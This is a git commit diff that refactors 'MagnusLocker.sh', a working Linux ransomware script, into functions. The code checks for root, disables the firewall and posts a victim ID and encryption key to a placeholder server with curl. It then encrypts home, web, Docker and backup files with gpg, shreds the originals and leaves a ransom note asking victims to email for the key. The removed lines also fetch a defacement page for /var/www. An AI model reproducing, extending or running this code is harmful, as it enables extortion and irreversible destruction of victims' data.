80b409d46e081758a15c241023a3fe770f51c516
Twemlow <79366364+TwemlowsEmrys@users.noreply.github.com>
2023-01-17 01:11:49 +0000

    MagnusLocker.sh

--- MagnusLocker.sh
+++ MagnusLocker.sh
@@ -5,95 +5,105 @@
 # Author: Twemlow
 # Hack The Planet!
 
-if [[ $EUID -ne 0 ]]; then
-    echo "you must have root perms to run this script!"
-    exit 1
-fi
-
-distro=$(uname -a)
-
-if [[ $distro == *"Ubuntu"* ]] || [[ $distro == *"Debian"* ]]; then
-    package_manager="apt-get"
-elif [[ $distro == *"Red Hat"* ]] || [[ $distro == *"CentOS"* ]] || [[ $distro == *"Fedora"* ]]; then
-    package_manager="yum"
-else
-    echo "This script is not supported on this Linux distribution"
-    exit 1
-fi
-
-if [ -x "$(command -v ufw)" ]; then
-    echo 'Disabling ufw firewall...'
-    ufw disable
-    echo 'ufw firewall has been disabled'
-elif [ -x "$(command -v iptables)" ]; then
-    echo 'Disabling iptables firewall...'
-    iptables -F
-    echo 'iptables firewall has been disabled'
-else
-    echo 'No firewall set up'
-fi
-
-if ! [ -x "$(command -v gpg)" ]; then
-    echo 'Error: gpg is not installed. Installing gpg...'
-    $package_manager update && $package_manager install -y gnupg
-    echo 'gpg has been installed'
-else
-    echo 'gpg is already installed'
-fi
-
-if ! [ -x "$(command -v curl)" ]; then
-    echo 'Error: curl is not installed. Installing curl...'
-    $package_manager update && $package_manager install -y curl
-    echo 'curl has been installed'
-else
-    echo 'curl is already installed'
-fi
-
-if ! [ -x "$(command -v openssl)" ]; then
-    echo 'Error: openssl is not installed. Installing openssl...'
-    $package_manager update && $package_manager install -y openssl
-    echo 'openssl has been installed'
-else
-    echo 'openssl is already installed'
-fi
-
-password=$(openssl rand -base64 32)
-
-victim_id=$(date +%s%N | cut -c1-11)
-
-curl --data "victimid=$victim_id&password=$password" http://server:port/magnus
-
-echo "Encryption in progress..."
-
-target_dir_1="/var/lib/docker/volumes"
-target_dir_2="/var/lib/docker/containers"
-target_dir_3="/home"
-target_dir_4="/var/www"
-target_dir_5="/home/backups"
-target_dir_6="/var/backups"
-
-for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f); do
-    if [ -d "$file" ]; then
-        continue
+check_root() {
+    if [[ $EUID -ne 0 ]]; then
+        echo "you must have root perms to run this script!"
+        exit 1
     fi
-    echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" 
-done
+}
 
-for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f); do
-    if [ -f "$file.Magnus" ]; then
-        dd if=/dev/urandom of=$file bs=1M count=10
-        shred -n 10 -u $file
+distro() {
+    distro=$(uname -a)
+
+    if [[ $distro == *"Ubuntu"* ]] || [[ $distro == *"Debian"* ]]; then
+        package_manager="apt-get"
+    elif [[ $distro == *"Red Hat"* ]] || [[ $distro == *"CentOS"* ]] || [[ $distro == *"Fedora"* ]]; then
+        package_manager="yum"
+    else
+        echo "This script is not supported on this Linux distribution"
+        exit 1
     fi
-done
+}
 
-echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
+disable_firewall() {
+    if [ -x "$(command -v ufw)" ]; then
+        echo 'Disabling ufw firewall...'
+        ufw disable
+        echo 'ufw firewall has been disabled'
+    elif [ -x "$(command -v iptables)" ]; then
+        echo 'Disabling iptables firewall...'
+        iptables -F
+        echo 'iptables firewall has been disabled'
+    else
+        echo 'No firewall set up'
+    fi
+}
 
-for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type d); do
-    cp R34DM3.txt "$dir/R34DM3.txt"
-done
+install_dependencies() {
+    if ! [ -x "$(command -v gpg)" ]; then
+        echo 'Error: gpg is not installed. Installing gpg...'
+        $package_manager update && $package_manager install -y gnupg
+        echo 'gpg has been installed'
+    else
+        echo 'gpg is already installed'
+    fi
 
-wget -P $target_dir_4 http://server/index.html
+    if ! [ -x "$(command -v curl)" ]; then
+        echo 'Error: curl is not installed. Installing curl...'
+        $package_manager update && $package_manager install -y curl
+        echo 'curl has been installed'
+    else
+        echo 'curl is already installed'
+    fi
 
-find $target_dir_4 -name "index.*" -type f -execdir mv index.html {} \;
+    if ! [ -x "$(command -v openssl)" ]; then
+        echo 'Error: openssl is not installed. Installing openssl...'
+        $package_manager update && $package_manager install -y openssl
+        echo 'openssl has been installed'
+    else
+        echo 'openssl is already installed'
+    fi
+}
 
-echo "Encryption has finished!"
+encrypt_files() {
+    password=$(openssl rand -base64 32)
+
+    victim_id=$(date +%s%N | cut -c1-11)
+
+    curl --data "victimid=$victim_id&password=$password" http://server:port/magnus
+
+    echo "Encryption in progress..."
+
+    target_dir_1="/var/lib/docker/volumes"
+    target_dir_2="/var/lib/docker/containers"
+    target_dir_3="/home"
+    target_dir_4="/var/www"
+    target_dir_5="/home/backups"
+    target_dir_6="/var/backups"
+
+    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f); do
+        if [ -d "$file" ]; then
+            continue
+        fi
+        echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" 
+    done
+
+    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f); do
+        if [ -f "$file.Magnus" ]; then
+            dd if=/dev/urandom of=$file bs=1M count=5
+            shred -n 2 -u $file
+        fi
+    done
+
+    echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
+
+    for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type d); do
+        cp R34DM3.txt "$dir/R34DM3.txt"
+    done
+}
+
+check_root
+distro
+disable_firewall
+install_dependencies
+encrypt_files
